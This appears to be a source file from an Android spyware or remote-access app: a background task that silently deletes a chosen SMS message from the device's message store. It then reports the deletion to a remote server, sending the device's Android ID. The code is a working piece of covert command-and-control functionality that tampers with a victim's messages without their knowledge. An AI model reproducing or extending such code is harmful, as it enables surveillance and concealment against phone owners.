package u.can.i.up.expert.utils;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class deleteSms extends AsyncTask<String, Void, String> {
    String i = "";
    String j = "";
    public deleteSms(String i, String j) {
        this.i = i;
        this.j = j;
    }
    @Override
    protected String doInBackground(String... params) {
        Uri thread = Uri.parse( "content://sms");
        ContentResolver contentResolver = DataSet.getInstance().myService.getContentResolver();
//			Cursor cursor = contentResolver.query(thread, null, null, null,null);
        contentResolver.delete( thread, "thread_id=? and _id=?", new String[]{String.valueOf(i), String.valueOf(j)});

        try {
            Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "SMS Delete [" + i + "] [" + j + "] Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }

        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {
    }
    @Override
    protected void onPreExecute() {
    }
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
